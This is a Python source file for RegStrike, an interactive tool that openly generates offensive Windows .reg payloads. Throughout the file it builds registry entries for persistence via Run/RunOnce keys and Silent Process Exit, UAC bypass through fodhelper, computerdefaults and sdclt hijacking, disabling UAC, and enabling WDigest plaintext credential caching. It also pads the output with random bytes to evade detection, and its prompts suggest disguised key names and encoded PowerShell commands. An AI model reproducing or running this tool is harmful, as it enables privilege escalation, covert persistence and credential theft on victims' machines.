from os import urandom

regstrike_banner = """
      ___          ___ _       _ _        
     | _ \___ __ _/ __| |_ _ _(_) |_____  
     |   / -_) _` \__ \  _| '_| | / / -_) 
     |_|_\___\__, |___/\__|_| |_|_\_\___| 
             |___/                        
    
    >> Create offensive .reg payloads easy peasy :)
       https://github.com/itaymigdal/RegStrike
       By Itay Migdal
    """
reg_filename = "hi.reg"
payload_prefix = "Windows Registry Editor Version 5.00\n"
payload = payload_prefix
template_run = r"""
[{}\Software\Microsoft\Windows\CurrentVersion\{}]
"{}"="{}"
"""
template_spe = r"""
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{0}]
"GlobalFlag"=dword:00000200

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{0}]
"ReportingMode"=dword:00000001
"MonitorProcess"="{1}"
"""
template_bypass_uac = r"""
[HKEY_CURRENT_USER\software\classes\{}\shell\open\command]
"DelegateExecute"=""
""="{}"
"""
template_disable_uac = r"""
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
"EnableLUA"=dword:00000000
"""
template_wdigest = r"""
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest]
"UseLogonCredential"=dword:00000001
"""


def sanitize_command(command):
    bad_chars = {
        '"': r'\"'
    }
    for c in bad_chars:
        command = command.replace(c, bad_chars[c])
    return command


def add_run():
    global payload
    while True:
        print("[>] Choose hive and key:")
        print("[1] HKCU, Run")
        print("[2] HKCU, RunOnce")
        print("[3] HKLM, Run (requires admin)")
        print("[4] HKLM, RunOnce (requires admin)")
        print("[99] Back")
        i = int(input(">> "))
        if i == 1:
            run_hive = "HKEY_CURRENT_USER"
            run_key = "Run"
        elif i == 2:
            run_hive = "HKEY_CURRENT_USER"
            run_key = "RunOnce"
        elif i == 3:
            run_hive = "HKEY_LOCAL_MACHINE"
            run_key = "Run"
        elif i == 4:
            run_hive = "HKEY_LOCAL_MACHINE"
            run_key = "RunOnce"
        elif i == 99:
            return
        else:
            print("[-] No such option :(")
            continue
        print("[>] Enter key data name (e.g. GoogleUpdate):")
        data_name = input(">> ")
        print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
        command = sanitize_command(input(">> "))

        payload += template_run.format(run_hive, run_key, data_name, command)
        print("[+] Added")
        return


def add_uac_run():
    global payload
    while True:
        print("[>] Choose key:")
        print("[1] Run")
        print("[2] RunOnce")
        print("[99] Back")
        i = int(input(">> "))
        if i == 1:
            run_key = "Run"
        elif i == 2:
            run_key = "RunOnce"
        elif i == 99:
            return
        else:
            print("[-] No such option :(")
            continue
        print("[>] Choose UAC Bypass method:")
        print("[1] Fodhelper")
        print("[2] ComputerDefaults")
        print("[3] Sdclt")
        print("[99] Back")
        i = int(input(">> "))
        if i == 1:
            reg_class = "ms-settings"
            uac_binary = "fodhelper.exe"
        elif i == 2:
            reg_class = "ms-settings"
            uac_binary = "computerdefaults.exe"
        elif i == 3:
            reg_class = "folder"
            uac_binary = "sdclt.exe"
        elif i == 99:
            return
        else:
            print("[-] No such option :(")
            continue
        print("[>] Enter key data name (e.g. GoogleUpdate):")
        data_name = input(">> ")
        print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
        command = sanitize_command(input(">> "))
        payload += template_bypass_uac.format(reg_class, command)
        payload += template_run.format("HKEY_CURRENT_USER", run_key, data_name, uac_binary)
        print("[+] Added")
        return


def add_spe():
    global payload
    print("[>] Enter the process name that when exits will trigger the command (e.g. notepad.exe)")
    process_name = input(">> ")
    print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
    command = sanitize_command(input(">> "))
    payload += template_spe.format(process_name, command)
    print("[+] Added")


def add_persistence():
    print("[>] Choose:")
    print("[1] Add persistence using a Run/RunOnce key")
    print("[2] Add persistence using a Run/RunOnce key and UAC bypass")
    print("[3] Add persistence using Silent Process Exit technique (requires admin)")
    print("[99] Back")
    i = int(input(">> "))
    if i == 1:
        add_run()
    elif i == 2:
        add_uac_run()
    elif i == 3:
        add_spe()
    elif i == 99:
        return
    else:
        print("[-] No such option :(")


def mess_with_registry():
    global payload
    while True:
        print("[>] Choose:")
        print("[1] Disable UAC (requires admin)")
        print("[2] Enable plaintext credentials in memory via wdigest (requires admin)")
        print("[99] Back")
        i = int(input(">> "))
        if i == 1:
            payload += template_disable_uac
        if i == 2:
            payload += template_wdigest
        elif i == 99:
            return
        else:
            print("[-] No such option :(")
            continue
        print("[+] Added")
        return


def add_obfuscation(obf_length):
    global payload
    obfuscated_payload = b""
    splited_payload = payload.split("\n")
    obf_len_per_line = int(obf_length / splited_payload.count(""))

    for splited in splited_payload:
        if splited == "":
            obfuscated_payload += (b"\n" + urandom(obf_len_per_line) + b"\n")
        else:
            if splited.startswith('"'):
                splited = "\n" + splited
            obfuscated_payload += splited.encode()
    return obfuscated_payload


def print_payload():
    print(payload)


def reset_payload():
    global payload
    payload = payload_prefix
    print("[+] Payload reset")


def save_payload():
    global reg_filename
    print(f"[>] How many KB of obfuscation to add (0 for none)")
    obf_length = int(input(">> ")) * 1024
    obf_payload = add_obfuscation(obf_length)
    print(f"[>] Enter output file: (ENTER for default: {reg_filename})")
    alt_filename = input(">> ")
    if alt_filename != "":
        reg_filename = alt_filename
    with open(reg_filename, "wb") as f:
        f.write(obf_payload)
        print(f"[+] Payload saved as {reg_filename}")


def main_screen():
    while True:
        print("[>] Choose:")
        print("[1] Add persistence")
        print("[2] Mess with registry settings")
        print("[3] Print payload")
        print("[4] Reset payload")
        print("[5] Save payload")
        print("[99] Exit")
        i = int(input(">> "))
        if i == 1:
            add_persistence()
        elif i == 2:
            mess_with_registry()
        elif i == 3:
            print_payload()
        elif i == 4:
            reset_payload()
        elif i == 5:
            save_payload()
        elif i == 99:
            return
        else:
            print("[-] No such option :(")


if __name__ == '__main__':
    print(regstrike_banner)
    main_screen()
